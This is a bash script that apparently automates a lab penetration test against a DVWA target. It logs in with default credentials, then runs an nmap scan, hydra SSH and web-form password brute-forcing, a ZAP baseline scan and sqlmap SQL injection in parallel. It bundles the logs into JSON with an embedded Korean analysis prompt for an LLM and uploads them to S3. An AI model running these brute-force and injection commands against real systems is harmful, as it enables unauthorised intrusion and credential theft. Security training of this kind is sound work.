#!/bin/bash
set -uo pipefail
TS=$(date +%Y%m%dT%H%M%SZ)
OUT="/tmp/atk-tokyo-$TS.txt"
D=$(mktemp -d)
echo "== ATK from tokyo -> 1.2.3.4 @ $TS (5-way 병렬) ==" > "$OUT"
# 부팅 시 만든 attacker 이미지가 준비될 때까지 잠깐 대기
for i in $(seq 1 30); do [ -f /opt/attacker/READY ] && break; sleep 5; done
WL=/opt/attacker/wordlists
# 로그인은 빠르고(1~2초) ③⑤ 가 세션을 써야 하므로 병렬 시작 전에 동기적으로 먼저 한다.
JAR=$(mktemp)
SID=""; WHOST=""; WPORT=""
if [ -n "http://alb:8081" ]; then
  TOKEN=$(curl -s -c "$JAR" "http://alb:8081/login.php" | grep -oE "[0-9a-f]{32}" | head -1)
  curl -s -b "$JAR" -c "$JAR" --data "username=admin&password=password&Login=Login&user_token=$TOKEN" "http://alb:8081/login.php" -o /dev/null
  SID=$(awk "/PHPSESSID/{print \$7}" "$JAR" | tail -1)
  HP=$(echo "http://alb:8081" | sed -E "s#https?://##; s#/.*##"); WHOST=${HP%%:*}; WPORT=${HP##*:}; [ "$WPORT" = "$WHOST" ] && WPORT=80
fi

# --- 5개 전부 동시 실행 (t3.medium 4GB 전제) --------------------------------------
# nmap 은 자주 쓰는 포트만 본다(전체 -p- 는 필터링된 포트 재전송으로 5~15분씩 걸림).
{ echo "== [1] nmap =="; docker run --rm attacker:latest nmap -Pn -sV -T4 -p 22,80,443,3306,8080,8081 "1.2.3.4"; } >"$D/1-nmap.txt" 2>&1 &
{ echo "== [2] hydra ssh (victim) =="; docker run --rm -v $WL:/wl attacker:latest hydra -l "victim" -P /wl/pass.txt -t 8 -I "ssh://1.2.3.4"; } >"$D/2-hydra-ssh.txt" 2>&1 &
if [ -n "http://alb:8081" ]; then
  { echo "== [3] hydra dvwa web (session $SID) =="; docker run --rm -v $WL:/wl attacker:latest hydra -L /wl/users.txt -P /wl/pass.txt -t 8 -s "$WPORT" "$WHOST" http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie\: PHPSESSID=$SID; security=low"; } >"$D/3-hydra-web.txt" 2>&1 &
  { echo "== [4] zap baseline =="; docker run --rm zaproxy/zap-stable zap-baseline.py -t "http://alb:8081" -I; } >"$D/4-zap.txt" 2>&1 &
  { echo "== [5] sqlmap =="; docker run --rm attacker:latest sqlmap -u "http://alb:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$SID; security=low" --batch --level=2 --risk=2; } >"$D/5-sqlmap.txt" 2>&1 &
else
  echo "== [3-5] dvwa web/zap/sqlmap skipped (WebBaseUrl 미지정) ==" >"$D/3-hydra-web.txt"
fi
wait

cat "$D"/*.txt >> "$OUT" 2>/dev/null

# --- 단계별 구조화 JSON 생성 (분석 프롬프트 포함) ---------------------------------
# 값은 env 로 넘겨 파이썬이 os.environ 으로 읽는다 → 셸/JSON 따옴표 충돌·인젝션 회피.
# python3 는 Ubuntu 클라우드 이미지 기본 포함(cloud-init 이 씀). 혹시 없으면 설치.
command -v python3 >/dev/null || (sudo apt-get update -y && sudo apt-get install -y python3)
OUTJSON="/tmp/atk-tokyo-$TS.json"
export ATK_REGION="tokyo" ATK_TARGET="1.2.3.4" ATK_WEBURL="http://alb:8081" ATK_TS="$TS" ATK_DIR="$D" ATK_OUT="$OUTJSON"
python3 - <<'PYEOF'
import json, glob, os
d = os.environ["ATK_DIR"]
steps = []
for f in sorted(glob.glob(os.path.join(d, "*.txt"))):
    base = os.path.basename(f)
    # 1-nmap.txt -> "nmap"
    name = base.split("-", 1)[-1].rsplit(".", 1)[0] if "-" in base else base
    with open(f, encoding="utf-8", errors="replace") as fh:
        steps.append({"step": name, "file": base, "output": fh.read()})
# 이 프롬프트는 JSON 마다 무조건 포함된다. 추출한 JSON 을 그대로 분석 도구/LLM 에 넣으면
# 근거 기반 분석 자료가 나오도록 지시한다.
prompt = (
    "다음 JSON 은 격리된 팀 소유 실습 환경(DVWA)에서 수행한 모의 공격 로그다. "
    "steps 배열의 각 단계(nmap 포트 스캔·hydra SSH/웹 무차별 대입·ZAP 베이스라인·sqlmap SQL 주입)의 "
    "output 에 실제로 나타난 사실만 근거로, 정확한 보안 분석 자료를 작성하라. "
    "각 단계별로 (1) 무엇을 시도했는지, (2) 실제로 성공/발견된 것(열린 포트, 유효 자격증명, 취약점, 주입 지점 등), "
    "(3) 위험도와 근거, (4) 권고 대응을 정리하라. "
    "로그에 근거가 없는 내용은 추측·과장하지 말고 '근거 없음'으로 명시하라. "
    "출력에 없는 자격증명·취약점을 지어내지 마라."
)
result = {
    "analysisPrompt": prompt,
    "regionLabel": os.environ.get("ATK_REGION", ""),
    "targetHost": os.environ.get("ATK_TARGET", ""),
    "webBaseUrl": os.environ.get("ATK_WEBURL", ""),
    "timestamp": os.environ.get("ATK_TS", ""),
    "steps": steps,
}
with open(os.environ["ATK_OUT"], "w", encoding="utf-8") as fh:
    json.dump(result, fh, ensure_ascii=False, indent=2)
PYEOF

rm -rf "$D" "$JAR"
# 결과 업로드 (지역별 프리픽스) — 원본 .txt 와 구조화 .json 둘 다.
aws s3 cp "$OUT" "s3://bkt/atk/tokyo/$TS.txt"
aws s3 cp "$OUTJSON" "s3://bkt/atk/tokyo/$TS.json"
echo "uploaded to s3://bkt/atk/tokyo/$TS.{txt,json}"